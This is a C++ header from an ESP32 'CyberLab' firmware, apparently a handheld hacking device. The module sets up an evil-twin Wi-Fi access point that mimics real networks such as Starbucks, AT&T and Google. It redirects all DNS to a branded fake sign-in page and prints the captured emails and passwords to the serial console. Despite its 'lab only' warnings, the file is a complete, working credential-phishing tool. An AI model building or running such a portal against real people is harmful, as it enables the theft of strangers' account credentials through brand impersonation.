/*
 * ============================================================================
 * [NEV]² - NEV-OS CyberLab v3.0
 * module_wifi_evil.h - Evil twin portal (more realistic phishing template)
 *
 * ATENÇÃO: Use APENAS em ambiente de laboratório. Capturar credenciais alheias
 * sem autorização é CRIME.
 * ============================================================================
 */
#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include "config.h"
#include "types.h"
#include "ui_helpers.h"
#include "module_wifi_captive.h"

extern TFT_eSPI tft;
extern DNSServer dnsServer;
extern WebServer webServer;
extern AppState currentState;
extern int evilTemplateIdx;

// Evil portal templates (SSID clones + custom HTML titles)
struct EvilTemplate {
  const char* ssid;
  const char* title;
  const char* subtitle;
};

const EvilTemplate evilTemplates[] = {
  {"Starbucks WiFi",  "Starbucks",  "Free Wi-Fi - Sign in"},
  {"Hotel_Guest",     "Hotel Guest Network", "Complimentary Internet"},
  {"Airport_Free",    "Airport Free Wi-Fi",  "Connect to continue"},
  {"Google_Star",     "Google Star",         "Authenticate to proceed"},
  {"NETGEAR",         "Router Configuration", "Login required"},
  {"ATT-WiFi",        "AT&T Wi-Fi",          "Account verification"},
};

#define EVIL_TPL_COUNT (sizeof(evilTemplates)/sizeof(EvilTemplate))

// Custom HTML for evil portal
const char EVIL_INDEX[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>%s</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;margin:0;padding:20px;color:#333;}
.box{max-width:380px;margin:30px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
h1{color:%s;text-align:center;margin:0 0 10px;}
p.sub{color:#666;text-align:center;margin:0 0 20px;font-size:14px;}
input{width:100%%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%%;padding:12px;background:%s;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
.foot{text-align:center;margin-top:20px;font-size:11px;color:#999;}
</style></head><body>
<div class="box">
<h1>%s</h1>
<p class="sub">%s</p>
<form action="/c" method="GET">
<input name="e" type="email" placeholder="Email" required>
<input name="p" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<p class="foot">Captive Portal - Lab Demo</p>
</div></body></html>
)rawliteral";

const char EVIL_OK[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>OK</title>
<meta http-equiv="refresh" content="3;url=http://192.168.4.1/">
<style>body{font-family:sans-serif;background:#fff;text-align:center;padding:80px;color:#0a0;}</style>
</head><body><h1>Authenticated</h1><p>You are now online.</p></body></html>
)rawliteral";

inline void handleEvilRoot() {
  char html[1024];
  const EvilTemplate& tpl = evilTemplates[evilTemplateIdx];
  const char* bg = "#006241";   // Starbucks green default
  // Pick color by index
  switch (evilTemplateIdx % 6) {
    case 0: bg = "#006241"; break;  // Starbucks green
    case 1: bg = "#003580"; break;  // Booking/Hotel blue
    case 2: bg = "#003366"; break;  // Airport navy
    case 3: bg = "#4285f4"; break;  // Google blue
    case 4: bg = "#00ff00"; break;  // NETGEAR green
    case 5: bg = "#00a8e0"; break;  // AT&T blue
  }
  snprintf(html, sizeof(html), EVIL_INDEX, tpl.title, bg, bg, tpl.title, tpl.subtitle);
  webServer.send(200, "text/html", html);
}

inline void handleEvilCapture() {
  String email = webServer.arg("e");
  String pass = webServer.arg("p");
  Serial.printf("[EVIL PORTAL] CAPTURED: email=%s password=%s\n", email.c_str(), pass.c_str());
  webServer.send(200, "text/html", EVIL_OK);
}

inline void handleEvilNotFound() {
  webServer.sendHeader("Location", "http://192.168.4.1/");
  webServer.send(302, "text/plain", "");
}

inline void enterWifiEvil() {
  currentState = STATE_WIFI_EVIL;
  evilTemplateIdx = 0;

  tft.fillScreen(COLOR_BG);
  drawHeader("Evil Portal", true);
  drawCenteredText("Configurando...", 60, COLOR_WARN, 1);

  // Cycle templates by user request: show current on screen
  // For simplicity, use template 0 (Starbucks)
  const EvilTemplate& tpl = evilTemplates[evilTemplateIdx];

  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(tpl.ssid);
  delay(200);
  IPAddress IP = WiFi.softAPIP();

  dnsServer.start(53, "*", IP);
  webServer.on("/", HTTP_GET, handleEvilRoot);
  webServer.on("/c", HTTP_GET, handleEvilCapture);
  webServer.onNotFound(handleEvilNotFound);
  webServer.begin();

  tft.fillScreen(COLOR_BG);
  drawHeader("Evil Portal ATIVO", true);
  drawPanel(20, 30, 280, 150);
  tft.setTextColor(COLOR_DANGER);
  tft.setTextSize(1);
  tft.setCursor(30, 42);
  tft.print("ATENCAO: APENAS LAB!");
  tft.setTextColor(COLOR_PRIMARY);
  tft.setCursor(30, 62);
  tft.printf("SSID: %s", tpl.ssid);
  tft.setCursor(30, 82);
  tft.printf("IP: %d.%d.%d.%d", IP[0], IP[1], IP[2], IP[3]);
  tft.setCursor(30, 102);
  tft.print("Aguardando conexao...");
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, 122);
  tft.print("Credenciais vao pro Serial.");
  drawCenteredText("Conecte para teste", 195, COLOR_TEXT, 1);
  drawStatusBar("Longo:parar  BACK:sair");
}

inline void exitWifiEvil() {
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

inline void handleEvilLoop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
